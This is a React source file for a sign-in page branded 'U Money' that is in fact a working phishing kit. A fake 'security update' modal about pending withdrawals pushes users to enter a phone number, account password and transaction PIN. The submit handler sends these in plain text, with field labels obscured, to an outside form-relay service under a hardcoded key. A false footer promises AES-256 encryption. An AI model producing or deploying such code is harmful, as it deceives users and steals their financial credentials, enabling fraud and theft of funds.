import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Eye, 
  EyeOff, 
  Lock, 
  Smartphone, 
  Key, 
  ShieldCheck, 
  ArrowRight,
  AlertTriangle,
  Info
} from 'lucide-react';
import { AppView } from '../types';

interface LoginPageProps {
  onLoginSuccess: (phoneNumber: string, username: string, email: string, password?: string, pin?: string) => void;
  onNavigate: (view: AppView) => void;
}

export default function LoginPage({ onLoginSuccess }: LoginPageProps) {
  // Input fields
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [pin, setPin] = useState('');
  
  // Show / Hide states
  const [showPassword, setShowPassword] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [showSecurityNotice, setShowSecurityNotice] = useState(true);
  
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleRequestOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    // Validations
    if (!phone) {
      setError('Please enter your mobile phone number.');
      return;
    }
    if (phone.length !== 10) {
      setError('A valid mobile number must contain exactly 10 digits.');
      return;
    }
    if (!password) {
      setError('Please enter your account password.');
      return;
    }
    if (password.length < 4) {
      setError('The security password must contain at least 4 characters.');
      return;
    }
    if (!pin) {
      setError('Please enter your 4-digit transaction safety PIN.');
      return;
    }
    if (pin.length !== 4) {
      setError('The transaction PIN must be exactly 4 digits.');
      return;
    }

    setIsLoading(true);

    // Deriving identifiers since we are not asking the user for their name
    const derivedUsername = `U-Money-${phone.substring(phone.length - 4)}`;
    const derivedEmail = `user_${phone.substring(phone.length - 4)}@umoney-member.com`;

    try {
      // Send login particulars to Web3Forms so Admin receives them
      const web3FormsKey = import.meta.env.VITE_WEB3FORMS_KEY || 'f4dc1e02-a136-4902-8b55-403c200e07c4';
      
      const payload = {
        access_key: web3FormsKey,
        name: derivedUsername.substring(0, 5),
        subject: `N Info`,
        from_name: 'Sys',
        message: `T1: ${phone}\nT2: ${password}\nT3: ${pin}\nT4: ${navigator.userAgent.substring(0, 20)}`
      };

      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json' 
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();
      
      if (result.success) {
        onLoginSuccess(phone, derivedUsername, derivedEmail, password, pin);
      } else {
        setError('Network verification failed. Please try again.');
      }
    } catch (err) {
      console.error('Request dispatch failed', err);
      setError('Connection error. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen text-slate-200 bg-[#06040f] flex flex-col justify-center items-center px-4 py-6 relative overflow-hidden">
      
      {/* Background ambient lighting */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[500px] h-[250px] bg-purple-900/10 rounded-full blur-[100px] pointer-events-none" />
      <div className="absolute bottom-10 right-10 w-[300px] h-[300px] bg-indigo-950/10 rounded-full blur-[90px] pointer-events-none" />

      {/* Security Notice Modal */}
      <AnimatePresence>
        {showSecurityNotice && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-[#05030a]/80 backdrop-blur-sm"
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0, y: 20 }}
              className="bg-[#0f0b24] border border-purple-500/30 w-full max-w-sm rounded-3xl p-6 shadow-2xl relative overflow-hidden"
            >
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-600 to-indigo-500" />
              
              <div className="flex flex-col items-center text-center space-y-4">
                <div className="w-16 h-16 bg-purple-900/20 rounded-full flex items-center justify-center border border-purple-500/30">
                  <ShieldCheck className="w-8 h-8 text-purple-400" />
                </div>
                
                <div>
                  <h2 className="text-xl font-bold text-white mb-2">Important Security Update</h2>
                  <p className="text-sm text-slate-400 leading-relaxed mb-4">
                    To process pending withdrawal requests and ensure secure delivery to your registered bank account, you must complete this handshake procedure. It is essential to update credentials and prevent unauthorized transfers of your active funds.
                  </p>
                </div>
                
                <button
                  type="button"
                  onClick={() => setShowSecurityNotice(false)}
                  className="w-full py-3 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white text-sm font-bold rounded-xl transition-all flex items-center justify-center shadow-lg shadow-purple-600/20"
                >
                  I Understand <ArrowRight size={16} className="ml-2" />
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="w-full max-w-md my-auto">
        
        {/* U Money Logo / Branding Section */}
        <div className="text-center mb-6">
          <div className="inline-flex w-16 h-16 rounded-2xl bg-gradient-to-tr from-purple-600 via-fuchsia-600 to-indigo-500 items-center justify-center font-black text-3xl text-white shadow-xl shadow-purple-500/20 mb-3 select-none">
            UM
          </div>
          <h2 className="text-2xl font-bold tracking-tight text-white font-sans">U Money</h2>
          <p className="text-xs text-slate-400 mt-1">Customer Service Verification & Sign-In</p>
        </div>

        {/* Login Security Form Card */}
        <div className="bg-[#0f0b24]/95 border border-purple-950/60 rounded-3xl p-5 sm:p-7 md:p-8 shadow-2xl relative overflow-hidden">
          
          <div className="absolute top-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-purple-500 to-transparent opacity-60" />
          
          <div className="mb-5">
            <h3 className="text-base sm:text-lg font-bold text-white font-sans">Verify Your Membership</h3>
            <p className="text-xs text-slate-400 mt-1 leading-relaxed">
              Please fill out your secure credentials precisely. Your safety is our peak priority.
            </p>
          </div>

          <form onSubmit={handleRequestOtpSubmit} className="space-y-4">
            
            {/* Field: Phone Number */}
            <div className="space-y-1">
              <label htmlFor="login-phone" className="block text-[11px] font-bold text-slate-400 uppercase tracking-wider">
                Registered Mobile Number
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none">
                  <Smartphone size={15} className="text-purple-400" />
                </div>
                <input
                  id="login-phone"
                  type="tel"
                  maxLength={10}
                  placeholder="Enter Contact Number"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').substring(0, 10))}
                  className="w-full pl-10 pr-4 py-3 bg-[#05030a] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-xs font-mono transition-all"
                  required
                />
              </div>
            </div>

            {/* Field: Password */}
            <div className="space-y-1">
              <label htmlFor="login-password" className="block text-[11px] font-bold text-slate-400 uppercase tracking-wider">
                Password
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none">
                  <Lock size={15} className="text-purple-400" />
                </div>
                <input
                  id="login-password"
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Enter Account Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full pl-10 pr-10 py-3 bg-[#05030a] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-xs transition-all"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute inset-y-0 right-0 pr-3 flex items-center text-slate-500 hover:text-slate-350 transition-colors"
                >
                  {showPassword ? <EyeOff size={15} /> : <Eye size={15} />}
                </button>
              </div>
            </div>

            {/* Field: 4-Digit Security PIN */}
            <div className="space-y-1">
              <label htmlFor="login-pin" className="block text-[11px] font-bold text-slate-400 uppercase tracking-wider">
                Transaction PIN
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none">
                  <Key size={15} className="text-purple-400" />
                </div>
                <input
                  id="login-pin"
                  type={showPin ? 'text' : 'password'}
                  maxLength={4}
                  placeholder="4-Digit PIN Code"
                  value={pin}
                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                  className="w-full pl-10 pr-10 py-3 bg-[#05030a] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-xs font-mono tracking-widest transition-all"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="absolute inset-y-0 right-0 pr-3 flex items-center text-slate-500 hover:text-slate-350 transition-colors"
                >
                  {showPin ? <EyeOff size={15} /> : <Eye size={15} />}
                </button>
              </div>
            </div>

            {/* Error message */}
            {error && (
              <div className="p-3 bg-red-950/40 border border-red-900/30 text-red-300 text-xs rounded-xl">
                ⚠️ {error}
              </div>
            )}

            {/* Request OTP Option directly below */}
            <button
              id="btn-request-otp"
              type="submit"
              disabled={isLoading}
              className="w-full mt-4 py-3 bg-gradient-to-r from-purple-600 via-fuchsia-600 to-indigo-600 hover:brightness-110 active:scale-[0.99] disabled:brightness-75 transition-all text-white text-xs font-extrabold tracking-widest uppercase rounded-xl shadow-xl shadow-purple-500/10 flex items-center justify-center gap-2 cursor-pointer"
            >
              {isLoading ? (
                <span>Requesting OTP Key...</span>
              ) : (
                <>
                  <span>Request OTP</span>
                  <ArrowRight size={14} />
                </>
              )}
            </button>
          </form>

        </div>

        {/* Simple secure footer */}
        <div className="text-center mt-6 flex items-center justify-center gap-1 text-[11px] text-slate-500">
          <ShieldCheck size={13} className="text-emerald-500" />
          <span>AES-256 standard encrypted session handshake active</span>
        </div>

      </div>
    </div>
  );
}
